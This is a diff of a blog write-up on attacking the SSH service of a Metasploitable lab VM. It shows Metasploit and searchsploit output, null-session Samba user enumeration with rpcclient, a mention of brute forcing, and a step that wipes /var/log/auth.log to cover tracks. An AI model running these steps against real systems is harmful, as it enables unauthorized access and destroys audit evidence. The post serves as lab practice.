@@ -2,14 +2,12 @@
 
 This is a follow up of my last post on hacking that can be read [here](https://filimon-danopoulos.github.io/posts/2014-11-12_Metasploitable-1.html). 
 This time I will try my hands on the next service running on port 22. During this exercise I searched the web a bit and found numerous guides
-on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject and I will not do that either.
+on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject.
 This means I might very well find sub-optimal solutions for some problems, deal with it!
-
-Oh and just to clear, this will be long post!
 
 ## The target
 
-I will again target the same Metasploitable VM under the exact same circumstances as last time.
+I will target the same Metasploitable VM under the exact same circumstances as last time.
 Running on port 22 it has (from the previous `nmap` scan tar I saved to the file `target`):
 
 22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
@@ -19,53 +17,65 @@ Running on port 22 it has (from the previous `nmap` scan tar I saved to the file
 Since I have already scanned all the ports and know the version of the software I am targeting I have to find 
 some kind of weakness to exploit.
 
-### Scanning
+### Searching
 
-A quick search in the Metasploit console gives me:
+A quick search in the Metasploit console gives me loads of hits. 
+This is a partial result after I removed all irrelevant hits and cleaned up the output a bit:
 
     msf > search ssh
 
     Matching Modules
     ================
 
-       Name                                                        Disclosure Date  Rank       Description
-       ----                                                        ---------------  ----       -----------
-     auxiliary/dos/windows/ssh/sysax_sshd_kexchange              2013-03-17       normal     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
-     auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                    normal     SSH Key Exchange Init Corruption
-     auxiliary/fuzzers/ssh/ssh_version_15                                         normal     SSH 1.5 Version Fuzzer
-     auxiliary/fuzzers/ssh/ssh_version_2                                          normal     SSH 2.0 Version Fuzzer
-     auxiliary/fuzzers/ssh/ssh_version_corrupt                                    normal     SSH Version Corruption
-     auxiliary/pro/apps/ssh_key                                                   normal     PRO: SSH Key Recycler
-     auxiliary/pro/scanner/ssh/ssh_login_credential                               normal     SSH Public Key Login Scanner
-     auxiliary/scanner/ssh/cerberus_sftp_enumusers               2014-05-27       normal     Cerberus FTP Server SFTP Username Enumeration
-     auxiliary/scanner/ssh/ssh_enumusers                                          normal     SSH Username Enumeration
-     auxiliary/scanner/ssh/ssh_identify_pubkeys                                   normal     SSH Public Key Acceptance Scanner
-     auxiliary/scanner/ssh/ssh_login                                              normal     SSH Login Check Scanner
-     auxiliary/scanner/ssh/ssh_login_pubkey                                       normal     SSH Public Key Login Scanner
-     auxiliary/scanner/ssh/ssh_version                                            normal     SSH Version Scanner
-     exploit/apple_ios/ssh/cydia_default_ssh                     2007-07-02       excellent  Apple iOS Default SSH Password Vulnerability
-     exploit/linux/ssh/f5_bigip_known_privkey                    2012-06-11       excellent  F5 BIG-IP SSH Private Key Exposure
-     exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey  2014-03-17       excellent  Loadbalancer.org Enterprise VA SSH Private Key Exposure
-     exploit/linux/ssh/quantum_dxi_known_privkey                 2014-03-17       excellent  Quantum DXi V1000 SSH Private Key Exposure
-     exploit/linux/ssh/quantum_vmpro_backdoor                    2014-03-17       excellent  Quantum vmPRO Backdoor Command
-     exploit/linux/ssh/symantec_smg_ssh                          2012-08-27       excellent  Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
-     exploit/multi/http/gitlab_shell_exec                        2013-11-04       excellent  Gitlab-shell Code Execution
-     exploit/multi/ssh/sshexec                                   1999-01-01       manual     SSH User Code Execution
-     exploit/unix/ssh/array_vxag_vapv_privkey_privesc            2014-02-03       excellent  Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
-     exploit/unix/ssh/tectia_passwd_changereq                    2012-12-01       excellent  Tectia SSH USERAUTH Change Request Password Reset Vulnerability
-     exploit/windows/local/trusted_service_path                  2001-10-25       excellent  Windows Service Trusted Path Privilege Escalation
-     exploit/windows/ssh/freeftpd_key_exchange                   2006-05-12       average    FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
-     exploit/windows/ssh/freesshd_authbypass                     2010-08-11       excellent  Freesshd Authentication Bypass
-     exploit/windows/ssh/freesshd_key_exchange                   2006-05-12       average    FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow
-     exploit/windows/ssh/putty_msg_debug                         2002-12-16       normal     PuTTY Buffer Overflow
-     exploit/windows/ssh/securecrt_ssh1                          2002-07-23       average    SecureCRT SSH1 Buffer Overflow
-     exploit/windows/ssh/sysax_ssh_username                      2012-02-27       normal     Sysax 5.53 SSH Username Buffer Overflow
-     post/linux/gather/enum_network                                               normal     Linux Gather Network Information
-     post/multi/gather/ssh_creds                                                  normal     Multi Gather OpenSSH PKI Credentials Collection
-     post/windows/gather/credentials/mremote                                      normal     Windows Gather mRemote Saved Password Extraction
+     Name                                            Rank       Description
+     ----                                            ----       -----------
+     auxiliary/fuzzers/ssh/ssh_kexinit_corrupt       normal     SSH Key Exchange Init Corruption
+     auxiliary/fuzzers/ssh/ssh_version_15            normal     SSH 1.5 Version Fuzzer
+     auxiliary/fuzzers/ssh/ssh_version_2             normal     SSH 2.0 Version Fuzzer
+     auxiliary/fuzzers/ssh/ssh_version_corrupt       normal     SSH Version Corruption
+     auxiliary/pro/apps/ssh_key                      normal     PRO: SSH Key Recycler
+     auxiliary/pro/scanner/ssh/ssh_login_credential  normal     SSH Public Key Login Scanner
+     auxiliary/scanner/ssh/cerberus_sftp_enumusers   normal     Cerberus FTP Server SFTP Username Enumeration
+     auxiliary/scanner/ssh/ssh_enumusers             normal     SSH Username Enumeration
+     auxiliary/scanner/ssh/ssh_identify_pubkeys      normal     SSH Public Key Acceptance Scanner
+     auxiliary/scanner/ssh/ssh_login                 normal     SSH Login Check Scanner
+     auxiliary/scanner/ssh/ssh_login_pubkey          normal     SSH Public Key Login Scanner
+     auxiliary/scanner/ssh/ssh_version               normal     SSH Version Scanner
+     exploit/linux/ssh/f5_bigip_known_privkey        excellent  F5 BIG-IP SSH Private Key Exposure
+     exploit/linux/ssh/quantum_dxi_known_privkey     excellent  Quantum DXi V1000 SSH Private Key Exposure
+     exploit/linux/ssh/quantum_vmpro_backdoor        excellent  Quantum vmPRO Backdoor Command
+     exploit/linux/ssh/symantec_smg_ssh              excellent  Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+     exploit/multi/http/gitlab_shell_exec            excellent  Gitlab-shell Code Execution
+     exploit/multi/ssh/sshexec                       manual     SSH User Code Execution
+     post/linux/gather/enum_network                  normal     Linux Gather Network Information
+     post/multi/gather/ssh_creds                     normal     Multi Gather OpenSSH PKI Credentials Collection
 
 This is a lot to take in and at first glance nothing seems applicable as a quick exploit. So instead of wasting time going through everything
-I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify that the version I found earlier is valid.
+I turn to the next tool, `searchsploit`. My aim is to find an SSH exploit that is not in metasploit.
+
+    # searchsploit openssh
+     Description                                                                         Path
+    ---------------------------------------------------------------------------------- ----------------------------------
+    OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool                                | /linux/remote/25.c
+    OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)                              | /linux/remote/26.sh
+    glibc-2.2 and openssh-2.3.0p1 exploits glibc => 2.1.9x                            | /linux/local/258.sh
+    Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service                  | /multiple/dos/1572.pl
+    OpenSSH <= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit             | /multiple/dos/2444.sh
+    Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit                   | /multiple/remote/3303.sh
+    Debian OpenSSH Remote SELinux Privilege Elevation Exploit (auth)                  | /linux/remote/6094.txt
+    Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                | /novell/dos/14866.txt
+    FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                       | /freebsd/remote/17462.txt
+    OpenSSH 1.2 scp File Create/Overwrite Vulnerability                               | /linux/remote/20253.sh
+    OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By-One Vulnerability                     | /unix/remote/21314.txt
+    OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability            | /linux/remote/21402.txt
+    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)                | /unix/remote/21578.txt
+    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)                | /unix/remote/21579.txt
+
+Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 
+
+### Scanning
+
+I decided to run `auxiliary/scanner/ssh/ssh_version` in order to verify that the version I found earlier is valid.
 
     msf > use auxiliary/scanner/ssh/ssh_version  
     msf auxiliary(ssh_version) > show options
@@ -89,31 +99,10 @@ I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify tha
     
 This verifies the version. Let's go to the next step!
 
-### Searching
+At this stage I want to apply a vulnerability scanner like openvas, but I failed with the setup (didn't read the manual) and I can't 
+be bothered with that since I want to get in the machine! I don't think a vulnerability scanner would add much at this stage any how.
 
-Nothing fruit full yet so I turn to the next tool, `searchsploit`.
-
-    # searchsploit openssh
-     Description                                                                         Path
-    ---------------------------------------------------------------------------------- ----------------------------------
-    OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool                                | /linux/remote/25.c
-    OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)                              | /linux/remote/26.sh
-    glibc-2.2 and openssh-2.3.0p1 exploits glibc => 2.1.9x                            | /linux/local/258.sh
-    Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service                  | /multiple/dos/1572.pl
-    OpenSSH <= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit             | /multiple/dos/2444.sh
-    Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit                   | /multiple/remote/3303.sh
-    Debian OpenSSH Remote SELinux Privilege Elevation Exploit (auth)                  | /linux/remote/6094.txt
-    Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                | /novell/dos/14866.txt
-    FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                       | /freebsd/remote/17462.txt
-    OpenSSH 1.2 scp File Create/Overwrite Vulnerability                               | /linux/remote/20253.sh
-    OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By-One Vulnerability                     | /unix/remote/21314.txt
-    OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability            | /linux/remote/21402.txt
-    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)                | /unix/remote/21578.txt
-    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)                | /unix/remote/21579.txt
-
-Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 
-At this stage I would apply a vulnerability scanner but I couldn't get openvas to function correctly and couldn't be bothered
-to figure out how to set it up correctly so I decided to try a common SSH vulnerability. Brute forcing, but fist...
+Next up is a common SSH vulnerability: brute forcing, but fist...
 
 ### Enumeration of users
 
@@ -140,7 +129,7 @@ Having a set of valid users will really help speed up the brute forcing so I che
 
 
 This doesn't tell me the affected version so I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
-One of the affected versions is the one the target are running, sweet!
+One of the affected versions is the one the target is running, sweet, let's do this!
 
     msf > use auxiliary/scanner/ssh/ssh_enumusers 
     msf auxiliary(ssh_enumusers) > show options
@@ -168,13 +157,11 @@ One of the affected versions is the one the target are running, sweet!
     .
     .
 
-After running this for a while I decided to stop the scan, it's super slow and somehow didn't *feel* right.
-I had a hunch that something might not be well with this approach and I know for a fact that a user on the target system is `msfadmin`. 
-So tot test this out I created a new file including only this user name, ran the above with the new file but did not get a hit either 
-so the above vunerability could not be exploited.
+After running this for a while I decide to stop the scan, it's super slow and some how didn't *feel* right.
+I have a hunch that this approach will fail, and that the target is not vulnerable to this attack after all.
 
-I really wanted to target all my effort on port 22 but i could figure out a way to enumerate the users via SSH so instead I decided to enumerate the users via a Samba vulnerability.
-My target is running (from my previous scan)
+I really want to target all my effort on port 22 but I can't figure out a way to enumerate the users via SSH so instead I decided to do it via a Samba vulnerability.
+My target is running (from my previous scan):
     
     139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
     
@@ -184,7 +171,7 @@ I know as a fact that Samba can be missconfigured to allow null sessions so I gi
     Enter 's password: 
     rpcclient $>
 
-This tells me that the machine is not configured properly so I run:
+So I have a null session up and running, next is just a simple command to get all the users:
 
     rpcclient $> enumdomusers
     user:[games] rid:[0x3f2]
@@ -223,13 +210,11 @@ This tells me that the machine is not configured properly so I run:
     user:[sync] rid:[0x3f0]
     user:[uucp] rid:[0x3fc]
     
-And get a list of all the users! I copy the above and create a file, paste it then format it to only include usernames:
+And I get a list of all the users! I copy the above and create a file, open it in vim, paste the users into to it then format it to only include usernames:
 
     # touch users.lst
     # vim users.lst 
     # cat users.lst | cut -d[ -f2 | cut -d] -f1 > users.lst
-
-The actual list contains load of juicy users but for this excercise let's focus on a single user, `msfadmin`.
 
 ### Brute forcing
 
@@ -296,19 +281,20 @@ Next we try to login to the machine via SSH:
     
 ### Clean up
     
-So I have a user, a password and I can lauch stuff as root! One of the things I have to do know is clear some my tracks.
-The file `/var/log/auth.log` will include a huge amount of information about our SSH enumeration attempt and bruteforce atack, 
-the lazy way to clean it is just remove everything.
+So I have a user, a password and I can launch stuff as root! One of the things I have to do know is clear some of my tracks.
+The file `/var/log/auth.log` will include a huge amount of information about our SSH enumeration attempt and brute force attack, 
+the lazy way to clean it is just remove everything. This just covers the how but not the fact the machine was compromised.
     
     # grep 'sshd' /var/log/auth.log | wc -l
     26659
     # echo "" >  /var/log/auth.log
     
-Here we can see that we have almost 27000 log entries related too SSH, after we wipe it nothing of that will remain.
+Here we can see that we have almost 27000 log entries related too SSH, after we wipe it nothing of that will remain. 
+The elegant solution would be to just remove all the entries that our brute force attack created, but I can't be bothered at this stage since I have been at it for a while now.
 
 ### Summary
 
-This was a lot harder than the port 21 hack but still not imposible. I made a clear mistake trying to enumerate the SSH user and should have gone
+This was a lot harder than the port 21 hack but still not impossible. I made a clear mistake trying to enumerate the SSH user and should have gone
 for the Samba vulnerability right away. I was a bit to focused to do this port by port for the heck of it, but that is not how pentesting works.
 I had a wealth of information and available (and a root shell) from previous activity, so I wanted to put some restrictions on my self but had to break them.
 
